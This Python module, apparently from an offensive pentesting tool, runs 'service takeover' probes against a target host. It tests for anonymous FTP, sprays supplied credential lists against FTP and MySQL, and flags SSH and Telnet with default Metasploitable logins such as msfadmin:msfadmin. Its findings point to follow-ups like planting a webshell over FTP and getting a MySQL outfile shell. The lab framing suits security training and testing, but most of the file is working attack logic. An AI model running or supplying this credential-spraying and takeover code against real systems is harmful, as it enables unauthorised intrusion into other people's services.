"""Run all service-level takeover probes."""

from __future__ import annotations

from terminator.tools.http import port_open
from terminator.tools.services.ftp_probe import probe_ftp_anonymous, spray_ftp_creds
from terminator.tools.services.mysql_probe import probe_mysql_weak


def run_service_takeover_scan(host: str, creds: list[tuple[str, str]]) -> tuple[str, list[dict]]:
    parts = []
    findings: list[dict] = []

    if port_open(host, 21):
        anon = probe_ftp_anonymous(host)
        parts.append(anon)
        if "vulnerable: True" in anon:
            findings.append({
                "category": "ftp_anonymous",
                "technique": "anonymous_login",
                "severity": "high",
                "path": f"ftp://{host}:21",
                "param": "user",
                "payload": "anonymous",
                "note": "anonymous FTP — upload/read for webshell",
                "phase": "takeover",
                "foothold": "ftp",
            })
        spray = spray_ftp_creds(host, creds)
        parts.append(spray)
        for line in spray.splitlines():
            if line.startswith("  [+]"):
                findings.append({
                    "category": "ftp_creds",
                    "technique": "cred_spray",
                    "severity": "critical",
                    "path": f"ftp://{host}:21",
                    "param": "auth",
                    "payload": line.strip(),
                    "note": line.strip(),
                    "phase": "takeover",
                    "foothold": "shell_via_ftp",
                })

    if port_open(host, 3306):
        mysql_out = probe_mysql_weak(host, creds)
        parts.append(mysql_out)
        if "vulnerable: True" in mysql_out:
            findings.append({
                "category": "mysql_weak",
                "technique": "empty_root_password",
                "severity": "critical",
                "path": f"mysql://{host}:3306",
                "param": "auth",
                "payload": "root:",
                "note": "MySQL weak credentials — database takeover / outfile shell",
                "phase": "takeover",
                "foothold": "mysql",
            })

    # SSH/Telnet — report open + known creds for manual/script follow-up
    for port, svc in ((22, "ssh"), (23, "telnet")):
        if port_open(host, port):
            parts.append(
                f"=== {svc.upper()} open ===\ntarget: {host}:{port}\n"
                f"vulnerable: True\nsignals: {svc} open on Metasploitable — try msfadmin:msfadmin\n"
                f"FOOTHOLD: {svc} cred spray — msfadmin:msfadmin, user:user"
            )
            findings.append({
                "category": f"{svc}_access",
                "technique": "known_weak_creds",
                "severity": "critical",
                "path": f"{svc}://{host}:{port}",
                "param": "auth",
                "payload": "msfadmin:msfadmin",
                "note": f"{svc} port open — default lab creds likely work",
                "phase": "takeover",
                "foothold": f"{svc}_shell",
            })

    return "\n\n".join(parts), findings
